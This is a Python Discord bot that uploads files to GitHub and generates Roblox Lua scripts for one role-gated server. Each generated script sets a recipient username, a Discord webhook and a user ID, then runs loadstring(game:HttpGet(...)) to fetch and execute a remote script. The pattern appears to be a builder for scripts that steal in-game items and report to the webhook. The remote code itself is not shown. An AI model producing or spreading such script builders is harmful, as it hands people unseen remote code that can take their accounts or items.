import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import base64
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_REPO = os.getenv("GITHUB_REPO")
GUILD_ID = int(os.getenv("GUILD_ID"))  # Convert to integer
REQUIRED_ROLE_ID = 1338832718888173578  # Replace with your role ID

# Initialize bot with command tree
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

async def check_permissions(interaction: discord.Interaction) -> bool:
    if interaction.guild_id != GUILD_ID:
        await interaction.response.send_message(
            "❌ This command can only be used in the designated server.", ephemeral=True
        )
        return False

    user = interaction.user
    if not any(role.id == REQUIRED_ROLE_ID for role in user.roles):
        await interaction.response.send_message(
            "❌ You do not have permission to use this command.", ephemeral=True
        )
        return False

    return True

# Upload Command (Now accepts a file attachment)
@bot.tree.command(name="upload", description="Upload a file to GitHub")
async def upload(interaction: discord.Interaction, file: discord.Attachment):
    if not await check_permissions(interaction):
        return

    await interaction.response.defer(ephemeral=True)

    try:
        file_bytes = await file.read()
        encoded_content = base64.b64encode(file_bytes).decode()

        github_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{file.filename}"
        raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{file.filename}"  # Adjust if branch is different

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }

        # GitHub API payload
        data = {
            "message": f"Upload {file.filename}",
            "content": encoded_content
        }

        async with aiohttp.ClientSession() as session:
            async with session.put(github_url, headers=headers, json=data) as response:
                result = await response.json()
                if response.status in [200, 201]:
                    # Send the uploaded file as an attachment back to the user
                    await interaction.followup.send(
                        f"✅ File uploaded successfully!\n"
                        f"```lua\nloadstring(game:HttpGet(\"{raw_url}\"))()\n```",
                        ephemeral=True
                    )
                else:
                    error_msg = result.get("message", "Unknown error")
                    await interaction.followup.send(f"❌ Upload failed: {error_msg}", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {str(e)}", ephemeral=True)

# Create Command (Now sends a .lua file instead of plain text)
@bot.tree.command(name="create", description="Create a formatted Lua script file")
async def create(
    interaction: discord.Interaction, 
    username: str, 
    webhook: str, 
    mobile: bool, 
    userid: discord.Member, 
    username2: str = None
):
    if not await check_permissions(interaction):
        return

    await interaction.response.defer(ephemeral=True)

    raw_url = "https://raw.githubusercontent.com/YuzhuScripts/Games/main/NewGenFisch.lua"

    # Format the script content
    script_content = f'Username = "{username}"\n'
    if username2:
        script_content += f'Username2 = "{username2}"\n'
    script_content += f'Webhook = "{webhook}"\n'
    script_content += f'Mobile = {str(mobile).lower()}\n'  # Ensure boolean is lowercase (true/false)
    script_content += f'UserId = "{userid.id}"\n\n'
    script_content += f'loadstring(game:HttpGet("{raw_url}"))()'

    # Save to a .lua file
    filename = f"{username}_script.lua"
    with open(filename, "w", encoding="utf-8") as file:
        file.write(script_content)

    # Send file as an attachment
    await interaction.followup.send(
        "✅ Here is your generated Lua script:", 
        file=discord.File(filename),
        ephemeral=True
    )

    # Clean up the file after sending
    os.remove(filename)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Bot is ready and logged in as {bot.user}")

from keep_alive import keep_alive

keep_alive()  # Start the web server
bot.run(TOKEN)
